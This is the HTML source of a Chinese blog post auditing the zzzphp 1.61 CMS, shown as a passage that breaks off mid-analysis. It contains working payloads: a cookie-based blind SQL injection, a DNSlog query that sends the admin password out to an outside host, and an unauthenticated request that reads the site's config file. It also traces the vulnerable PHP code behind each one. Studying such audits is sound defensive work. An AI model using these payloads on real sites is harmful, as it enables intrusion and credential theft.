@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>zzzphp1.61 代码审计-从SQL注入到Getshell - F0rmat的博客 | 专注于网络攻防和信息安全</title>
+
+<meta name="description" content="0x01 前言 前天看到zzzphp这一个cms，看着有点像zzzcms，去看了也是zzzcms开发的一套程序，于是就去审计一下，这zzzcms我之前也有审计过 https://bbs.ichunqiu.com/thread-14684-1-1.html https://getpass.cn/zzcms-Any-user-password-changes-loopholes-code-points/ https://getpass.cn/ZZCMS8.2-any-file-deleted-to-getshell/ 这套程序漏洞确实比较多，后面也做了很多改善。 那天看了表哥写的一篇PHPCMS的代码审计文章，深有感悟，授人以鱼不如授人以渔，确实是，写那么多审计文章，从审计代码的开始到结束，这种文章少之甚少。我也希望我以后写的文章也带上这种方式。 这套审计的漏洞比较多，SQL注入漏洞、任意文件删除漏洞、任意文件读取漏洞、远程执行漏洞，当中也借助了漏扫工具。废话不多说，直接开始吧。 文章也是原来的方式，先复现后分析。
+0x02 SQL注入漏洞（ 获取管理员密码） 漏洞复现 payload:
+GET /search/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1;zzz_keys=0&amp;#39;XOR(if(now()=sysdate(),sleep(10),0))XOR&amp;#39;Z Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 对比两次的时间就晓得我们的语句执行成功了，表示存在SQL注入漏洞。 漏洞分析 这个洞是先用AWVS工具扫了一遍出来的，我们审计一套代码的时候可以先试试这些漏扫工具，提高一下效率。虽然有误报但是收集到的信息比手工去检测的效率高。
+大家测试的时候可以用PHPstorm或者vscode这些工具去调试，走一遍整个过程，这样会对程序有所了解。
+再发一次包到search页面会停留到search/index.php文件，这个文件比较简单，包含了一个zzz_client.php的文件。
+&amp;lt;?php define(&amp;#39;LOCATION&amp;#39;, &amp;#39;search&amp;#39;); require dirname(dirname(__FILE__)). &amp;#39;/inc/zzz_client.php&amp;#39;; 进到inc/zzz_client.php文件有一些包含的进来的文件类似模板的文件等，这里通过上面的LOCATION找到$tplfile= TPL_DIR . &#39;search.html&#39;; 
+switch ($location) { case &amp;#39;about&amp;#39;: $tplfile= TPL_DIR ." /><meta name="keywords"
+  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+
+
+<link rel="stylesheet" href="https://getshe11.com/css/main.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">
+
+
+
+<meta property="og:title" content="zzzphp1.61 代码审计-从SQL注入到Getshell" />
+<meta property="og:description" content="0x01 前言 前天看到zzzphp这一个cms，看着有点像zzzcms，去看了也是zzzcms开发的一套程序，于是就去审计一下，这zzzcms我之前也有审计过 https://bbs.ichunqiu.com/thread-14684-1-1.html https://getpass.cn/zzcms-Any-user-password-changes-loopholes-code-points/ https://getpass.cn/ZZCMS8.2-any-file-deleted-to-getshell/ 这套程序漏洞确实比较多，后面也做了很多改善。 那天看了表哥写的一篇PHPCMS的代码审计文章，深有感悟，授人以鱼不如授人以渔，确实是，写那么多审计文章，从审计代码的开始到结束，这种文章少之甚少。我也希望我以后写的文章也带上这种方式。 这套审计的漏洞比较多，SQL注入漏洞、任意文件删除漏洞、任意文件读取漏洞、远程执行漏洞，当中也借助了漏扫工具。废话不多说，直接开始吧。 文章也是原来的方式，先复现后分析。
+0x02 SQL注入漏洞（ 获取管理员密码） 漏洞复现 payload:
+GET /search/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1;zzz_keys=0&#39;XOR(if(now()=sysdate(),sleep(10),0))XOR&#39;Z Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 对比两次的时间就晓得我们的语句执行成功了，表示存在SQL注入漏洞。 漏洞分析 这个洞是先用AWVS工具扫了一遍出来的，我们审计一套代码的时候可以先试试这些漏扫工具，提高一下效率。虽然有误报但是收集到的信息比手工去检测的效率高。
+大家测试的时候可以用PHPstorm或者vscode这些工具去调试，走一遍整个过程，这样会对程序有所了解。
+再发一次包到search页面会停留到search/index.php文件，这个文件比较简单，包含了一个zzz_client.php的文件。
+&lt;?php define(&#39;LOCATION&#39;, &#39;search&#39;); require dirname(dirname(__FILE__)). &#39;/inc/zzz_client.php&#39;; 进到inc/zzz_client.php文件有一些包含的进来的文件类似模板的文件等，这里通过上面的LOCATION找到$tplfile= TPL_DIR . &#39;search.html&#39;; 
+switch ($location) { case &#39;about&#39;: $tplfile= TPL_DIR ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://getshe11.com/post/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell/" />
+<meta property="article:published_time" content="2019-03-10T17:56:36+00:00" />
+<meta property="article:modified_time" content="2019-03-10T17:56:36+00:00" />
+<meta itemprop="name" content="zzzphp1.61 代码审计-从SQL注入到Getshell">
+<meta itemprop="description" content="0x01 前言 前天看到zzzphp这一个cms，看着有点像zzzcms，去看了也是zzzcms开发的一套程序，于是就去审计一下，这zzzcms我之前也有审计过 https://bbs.ichunqiu.com/thread-14684-1-1.html https://getpass.cn/zzcms-Any-user-password-changes-loopholes-code-points/ https://getpass.cn/ZZCMS8.2-any-file-deleted-to-getshell/ 这套程序漏洞确实比较多，后面也做了很多改善。 那天看了表哥写的一篇PHPCMS的代码审计文章，深有感悟，授人以鱼不如授人以渔，确实是，写那么多审计文章，从审计代码的开始到结束，这种文章少之甚少。我也希望我以后写的文章也带上这种方式。 这套审计的漏洞比较多，SQL注入漏洞、任意文件删除漏洞、任意文件读取漏洞、远程执行漏洞，当中也借助了漏扫工具。废话不多说，直接开始吧。 文章也是原来的方式，先复现后分析。
+0x02 SQL注入漏洞（ 获取管理员密码） 漏洞复现 payload:
+GET /search/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1;zzz_keys=0&#39;XOR(if(now()=sysdate(),sleep(10),0))XOR&#39;Z Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 对比两次的时间就晓得我们的语句执行成功了，表示存在SQL注入漏洞。 漏洞分析 这个洞是先用AWVS工具扫了一遍出来的，我们审计一套代码的时候可以先试试这些漏扫工具，提高一下效率。虽然有误报但是收集到的信息比手工去检测的效率高。
+大家测试的时候可以用PHPstorm或者vscode这些工具去调试，走一遍整个过程，这样会对程序有所了解。
+再发一次包到search页面会停留到search/index.php文件，这个文件比较简单，包含了一个zzz_client.php的文件。
+&lt;?php define(&#39;LOCATION&#39;, &#39;search&#39;); require dirname(dirname(__FILE__)). &#39;/inc/zzz_client.php&#39;; 进到inc/zzz_client.php文件有一些包含的进来的文件类似模板的文件等，这里通过上面的LOCATION找到$tplfile= TPL_DIR . &#39;search.html&#39;; 
+switch ($location) { case &#39;about&#39;: $tplfile= TPL_DIR .">
+<meta itemprop="datePublished" content="2019-03-10T17:56:36+00:00" />
+<meta itemprop="dateModified" content="2019-03-10T17:56:36+00:00" />
+<meta itemprop="wordCount" content="1420">
+
+
+
+<meta itemprop="keywords" content="漏洞,代码审计,php,zzzphp," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="zzzphp1.61 代码审计-从SQL注入到Getshell"/>
+<meta name="twitter:description" content="0x01 前言 前天看到zzzphp这一个cms，看着有点像zzzcms，去看了也是zzzcms开发的一套程序，于是就去审计一下，这zzzcms我之前也有审计过 https://bbs.ichunqiu.com/thread-14684-1-1.html https://getpass.cn/zzcms-Any-user-password-changes-loopholes-code-points/ https://getpass.cn/ZZCMS8.2-any-file-deleted-to-getshell/ 这套程序漏洞确实比较多，后面也做了很多改善。 那天看了表哥写的一篇PHPCMS的代码审计文章，深有感悟，授人以鱼不如授人以渔，确实是，写那么多审计文章，从审计代码的开始到结束，这种文章少之甚少。我也希望我以后写的文章也带上这种方式。 这套审计的漏洞比较多，SQL注入漏洞、任意文件删除漏洞、任意文件读取漏洞、远程执行漏洞，当中也借助了漏扫工具。废话不多说，直接开始吧。 文章也是原来的方式，先复现后分析。
+0x02 SQL注入漏洞（ 获取管理员密码） 漏洞复现 payload:
+GET /search/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1;zzz_keys=0&#39;XOR(if(now()=sysdate(),sleep(10),0))XOR&#39;Z Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 对比两次的时间就晓得我们的语句执行成功了，表示存在SQL注入漏洞。 漏洞分析 这个洞是先用AWVS工具扫了一遍出来的，我们审计一套代码的时候可以先试试这些漏扫工具，提高一下效率。虽然有误报但是收集到的信息比手工去检测的效率高。
+大家测试的时候可以用PHPstorm或者vscode这些工具去调试，走一遍整个过程，这样会对程序有所了解。
+再发一次包到search页面会停留到search/index.php文件，这个文件比较简单，包含了一个zzz_client.php的文件。
+&lt;?php define(&#39;LOCATION&#39;, &#39;search&#39;); require dirname(dirname(__FILE__)). &#39;/inc/zzz_client.php&#39;; 进到inc/zzz_client.php文件有一些包含的进来的文件类似模板的文件等，这里通过上面的LOCATION找到$tplfile= TPL_DIR . &#39;search.html&#39;; 
+switch ($location) { case &#39;about&#39;: $tplfile= TPL_DIR ."/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+</head>
+
+<body>
+    <div class="header-placeholder"></div>
+    
+    <header class="header">
+        <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    
+    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
+    
+    <nav class="site-nav">
+        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
+    </nav>
+</div>
+
+    </header>
+
+    
+    <div class="page-content">
+        <div class="wrapper">
+            
+            <div class="col-main">
+                <div class="post">
+    
+    <header class="post-header">
+        <h1 class="post-title">Zzzphp1.61 代码审计-从SQL注入到Getshell</h1>
+        <p class="post-meta">Mar 10, 2019</p>
+    </header>
+    <article class="post-content">
+        
+        
+        
+        
+        
+        
+        <h1 id="0x01-前言">0x01 前言</h1>
+<p>前天看到zzzphp这一个cms，看着有点像zzzcms，去看了也是zzzcms开发的一套程序，于是就去审计一下，这zzzcms我之前也有审计过
+<a href="https://bbs.ichunqiu.com/thread-14684-1-1.html">https://bbs.ichunqiu.com/thread-14684-1-1.html</a>
+<a href="https://getpass.cn/zzcms-Any-user-password-changes-loopholes-code-points/">https://getpass.cn/zzcms-Any-user-password-changes-loopholes-code-points/</a>
+<a href="https://getpass.cn/ZZCMS8.2-any-file-deleted-to-getshell/">https://getpass.cn/ZZCMS8.2-any-file-deleted-to-getshell/</a>
+这套程序漏洞确实比较多，后面也做了很多改善。
+那天看了表哥写的一篇PHPCMS的代码审计文章，深有感悟，授人以鱼不如授人以渔，确实是，写那么多审计文章，从审计代码的开始到结束，这种文章少之甚少。我也希望我以后写的文章也带上这种方式。
+这套审计的漏洞比较多，SQL注入漏洞、任意文件删除漏洞、任意文件读取漏洞、远程执行漏洞，当中也借助了漏扫工具。废话不多说，直接开始吧。
+文章也是原来的方式，先复现后分析。</p>
+<!-- raw HTML omitted -->
+<h1 id="0x02-sql注入漏洞-获取管理员密码">0x02 SQL注入漏洞（ 获取管理员密码）</h1>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>payload:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">GET /search/ HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1;zzz_keys=0&#39;XOR(if(now()=sysdate(),sleep(10),0))XOR&#39;Z
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+</code></pre></div><p>对比两次的时间就晓得我们的语句执行成功了，表示存在SQL注入漏洞。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/1.png" alt=""></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/2.png" alt=""></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>这个洞是先用AWVS工具扫了一遍出来的，我们审计一套代码的时候可以先试试这些漏扫工具，提高一下效率。虽然有误报但是收集到的信息比手工去检测的效率高。</p>
+<p>大家测试的时候可以用PHPstorm或者vscode这些工具去调试，走一遍整个过程，这样会对程序有所了解。</p>
+<p>再发一次包到search页面会停留到<code>search/index.php</code>文件，这个文件比较简单，包含了一个<code>zzz_client.php</code>的文件。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;LOCATION&#39;</span><span class="p">,</span> <span class="s1">&#39;search&#39;</span><span class="p">);</span>
+<span class="k">require</span> <span class="nx">dirname</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">))</span><span class="o">.</span> <span class="s1">&#39;/inc/zzz_client.php&#39;</span><span class="p">;</span>
+</code></pre></div><p>进到<code>inc/zzz_client.php</code>文件有一些包含的进来的文件类似模板的文件等，这里通过上面的<code>LOCATION</code>找到<code>$tplfile= TPL_DIR . 'search.html'; </code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">switch</span> <span class="p">(</span><span class="nv">$location</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">case</span> <span class="s1">&#39;about&#39;</span><span class="o">:</span>
+   <span class="nv">$tplfile</span><span class="o">=</span> <span class="nx">TPL_DIR</span> <span class="o">.</span> <span class="nx">G</span><span class="p">(</span><span class="s1">&#39;stpl&#39;</span><span class="p">);</span>
+   <span class="k">break</span><span class="p">;</span> 
+<span class="k">case</span> <span class="s1">&#39;brand&#39;</span><span class="o">:</span>     
+   <span class="nv">$stpl</span><span class="o">=</span><span class="nx">splits</span><span class="p">(</span><span class="nx">db_select</span><span class="p">(</span><span class="s1">&#39;brand&#39;</span><span class="p">,</span><span class="s1">&#39;b_template&#39;</span><span class="p">,</span><span class="s2">&#34;bid=&#34;</span><span class="o">.</span><span class="nx">G</span><span class="p">(</span><span class="s1">&#39;bid&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="s2">&#34;b_name=&#39;&#34;</span><span class="o">.</span><span class="nx">G</span><span class="p">(</span><span class="s1">&#39;bname&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">),</span><span class="s1">&#39;,&#39;</span><span class="p">);</span>
+   <span class="k">if</span> <span class="p">(</span><span class="nx">defined</span><span class="p">(</span><span class="s1">&#39;ISWAP&#39;</span><span class="p">)){</span>
+     <span class="nv">$tplfile</span><span class="o">=</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$stpl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$stpl</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$stpl</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+   <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+     <span class="nv">$tplfile</span><span class="o">=</span><span class="nv">$stpl</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>   
+   <span class="p">}</span>
+   <span class="nv">$tplfile</span><span class="o">=</span><span class="k">empty</span><span class="p">(</span><span class="nv">$tplfile</span><span class="p">)</span> <span class="o">?</span> <span class="nx">TPL_DIR</span> <span class="o">.</span><span class="s1">&#39;brand.html&#39;</span> <span class="o">:</span> <span class="nx">TPL_DIR</span> <span class="o">.</span> <span class="nv">$tplfile</span> <span class="p">;</span>
+   <span class="k">break</span><span class="p">;</span> 
+<span class="k">case</span> <span class="s1">&#39;brandlist&#39;</span><span class="o">:</span>
+   <span class="nv">$tplfile</span><span class="o">=</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$stpl</span><span class="p">)</span> <span class="o">?</span> <span class="nx">TPL_DIR</span> <span class="o">.</span>  <span class="nv">$stpl</span><span class="o">:</span> <span class="nx">TPL_DIR</span> <span class="o">.</span> <span class="s1">&#39;brandlist.html&#39;</span><span class="p">;</span> 
+   <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;tid&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;-1&#39;</span><span class="p">;</span>
+   <span class="k">break</span><span class="p">;</span>
+<span class="k">case</span> <span class="s1">&#39;content&#39;</span><span class="o">:</span>       
+   <span class="nv">$tplfile</span><span class="o">=</span> <span class="nx">TPL_DIR</span> <span class="o">.</span> <span class="nx">G</span><span class="p">(</span><span class="s1">&#39;ctpl&#39;</span><span class="p">);</span>
+   <span class="k">break</span><span class="p">;</span> 
+<span class="k">case</span> <span class="s1">&#39;list&#39;</span><span class="o">:</span>
+   <span class="nv">$tplfile</span><span class="o">=</span> <span class="nx">TPL_DIR</span> <span class="o">.</span> <span class="nx">G</span><span class="p">(</span><span class="s1">&#39;stpl&#39;</span><span class="p">);</span>
+   <span class="k">break</span><span class="p">;</span>
+<span class="k">case</span> <span class="s1">&#39;taglist&#39;</span><span class="o">:</span>
+   <span class="nv">$tplfile</span><span class="o">=</span><span class="nx">TPL_DIR</span> <span class="o">.</span> <span class="s1">&#39;taglist.html&#39;</span><span class="p">;</span> 
+   <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;tid&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;-1&#39;</span><span class="p">;</span>
+   <span class="k">break</span><span class="p">;</span>
+<span class="k">case</span> <span class="s1">&#39;user&#39;</span><span class="o">:</span>
+   <span class="nv">$tplfile</span><span class="o">=</span> <span class="nx">TPL_DIR</span> <span class="o">.</span> <span class="s1">&#39;user.html&#39;</span><span class="p">;</span> 
+   <span class="k">break</span><span class="p">;</span>
+<span class="k">case</span> <span class="s1">&#39;search&#39;</span><span class="o">:</span>
+   <span class="nv">$tplfile</span><span class="o">=</span> <span class="nx">TPL_DIR</span> <span class="o">.</span> <span class="s1">&#39;search.html&#39;</span><span class="p">;</span> 
+   <span class="k">break</span><span class="p">;</span>
+</code></pre></div><p>到下面就实例化，解析模板</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$conf</span><span class="p">[</span><span class="s1">&#39;runmode&#39;</span><span class="p">]</span><span class="o">==</span><span class="mi">0</span><span class="o">||</span> <span class="nv">$conf</span><span class="p">[</span><span class="s1">&#39;runmode&#39;</span><span class="p">]</span><span class="o">==</span><span class="mi">2</span> <span class="o">||</span> <span class="nv">$location</span><span class="o">==</span><span class="s1">&#39;search&#39;</span> <span class="o">||</span><span class="nv">$location</span><span class="o">==</span><span class="s1">&#39;form&#39;</span> <span class="o">||</span><span class="nv">$location</span><span class="o">==</span><span class="s1">&#39;screen&#39;</span> <span class="o">||</span> <span class="nv">$location</span><span class="o">==</span><span class="s1">&#39;app&#39;</span><span class="p">){</span>
+<span class="nv">$zcontent</span> <span class="o">=</span> <span class="nx">load_file</span><span class="p">(</span><span class="nv">$tplfile</span><span class="p">,</span><span class="nv">$location</span><span class="p">);</span> 
+<span class="nv">$parser</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ParserTemplate</span><span class="p">();</span>
+<span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">parserCommom</span><span class="p">(</span><span class="nv">$zcontent</span><span class="p">);</span> <span class="c1">// 解析模板
+</span><span class="c1"></span><span class="k">echo</span> <span class="nv">$zcontent</span><span class="p">;</span>    
+</code></pre></div><p>往下走进到<code>inc/zzz_template.php</code>文件，注入的主要是<code>$zcontent = $this-&gt;parserlocation( $zcontent ); // 站点标签</code>这一句,继续<code>parserSearch</code>函数跟下去</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">case</span> <span class="s1">&#39;search&#39;</span><span class="o">:</span>
+   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserSearch</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span>
+</code></pre></div><p>走到<code>inc/zzz_template.php</code>的1561行，如果经过<code>getform</code>函数的话会被<code>txt_html</code>过滤掉，但是我们用的cookie，所以这里直接获取没有过滤。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$keys</span> <span class="o">=</span> <span class="nx">safe_key</span><span class="p">(</span><span class="nx">getform</span><span class="p">(</span> <span class="s1">&#39;keys&#39;</span><span class="p">,</span> <span class="s1">&#39;post&#39;</span> <span class="p">),</span><span class="mi">60</span><span class="p">);</span> 
+<span class="k">if</span> <span class="p">(</span> <span class="nv">$keys</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="nx">set_cookie</span><span class="p">(</span> <span class="s1">&#39;keys&#39;</span><span class="p">,</span> <span class="nv">$keys</span> <span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$keys</span> <span class="o">=</span> <span class="nx">get_cookie</span><span class="p">(</span> <span class="s1">&#39;keys&#39;</span> <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>我们可以进<code>get_cookie</code>函数看下,<code>prefix</code>前缀是<code>zzz_</code>所以我们的参数为<code>zzz_keys</code>，这里获取到了了数据但也没有过滤直接就返回了</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">get_cookie</span><span class="p">(</span> <span class="nv">$name</span> <span class="p">)</span> <span class="p">{</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="nx">is_null</span><span class="p">(</span> <span class="nv">$name</span> <span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+   <span class="nv">$data</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_COOKIE</span><span class="p">[</span> <span class="nv">$_SERVER</span><span class="p">[</span> <span class="s1">&#39;prefix&#39;</span> <span class="p">]</span> <span class="o">.</span> <span class="nv">$name</span> <span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$_COOKIE</span><span class="p">[</span> <span class="nv">$_SERVER</span><span class="p">[</span> <span class="s1">&#39;prefix&#39;</span> <span class="p">]</span> <span class="o">.</span> <span class="nv">$name</span> <span class="p">]</span> <span class="o">:</span> <span class="k">NULL</span><span class="p">;</span>
+   <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>下面就是直接执行了我们带有恶意的SQL语句了</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/3.png" alt=""></p>
+<p>知道有SQL注入漏洞后，可以直接扔进SQLmap或者用DNSlog，下面我提供一个DNSlog的payload：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">0</span><span class="s1">&#39;XOR(if(now()=sysdate(),(select load_file(concat(&#39;</span><span class="err">\\\\</span><span class="s1">&#39;,(select password from zzz_user where username=&#39;</span><span class="n">admin</span><span class="s1">&#39;),&#39;</span><span class="p">.</span><span class="n">xxxx</span><span class="p">.</span><span class="n">ceye</span><span class="p">.</span><span class="n">io</span><span class="err">\\</span><span class="n">abc</span><span class="s1">&#39;))),0))XOR&#39;</span><span class="n">Z</span>
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/4.png" alt=""></p>
+<h1 id="0x03-任意文件读取漏洞-获取敏感信息">0x03 任意文件读取漏洞 （获取敏感信息）</h1>
+<h2 id="漏洞复现-1">漏洞复现</h2>
+<p>payload：</p>
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/admin155/?module=templateedit&amp;type=/config/zzz_config.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Referer</span><span class="o">:</span> <span class="l">http://127.0.0.1/admin155/?datebackuplist</span>
+<span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1; zzz_adminpath=0; zzz_adminface=..%2Fplugins%2Fface%2Fface1.png; zzz_adminname=admin; XDEBUG_SESSION=PHPSTORM</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</code></pre></div><p>这个漏洞是无需登录后台的，后台的地址可以直接写一个Python脚本来爆破一下就行了，命名规则为<code>admin+三位随机数</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/5.png" alt=""></p>
+<h2 id="漏洞分析-1">漏洞分析</h2>
+<p>这个漏洞是在后台查看模板文件内容的时候找到的，抓一个包然后改变下路径看戏是否能读到其他的目录的文件。</p>
+<p>文件路径<code>admin155/index.php</code></p>
+<p>前面是获取<code>module</code>和<code>type</code>参数，看到文件的最后面包含文件这里，走进去看下</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">?</span> <span class="nx">arr_key</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="c1">//echop (parse_admin_tlp($module));die;
+</span><span class="c1"></span><span class="k">include</span> <span class="nx">parse_admin_tlp</span><span class="p">(</span><span class="nv">$module</span><span class="p">);</span>
+</code></pre></div><p>作用是把我们刚才传入的模板名称然后生成一个缓存文件</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">parse_admin_tlp</span><span class="p">(</span> <span class="nv">$module</span> <span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$tpltype</span> <span class="o">=</span> <span class="nx">G</span><span class="p">(</span> <span class="s1">&#39;ID&#39;</span> <span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;edit&#39;</span> <span class="o">:</span> <span class="s1">&#39;add&#39;</span><span class="p">;</span>
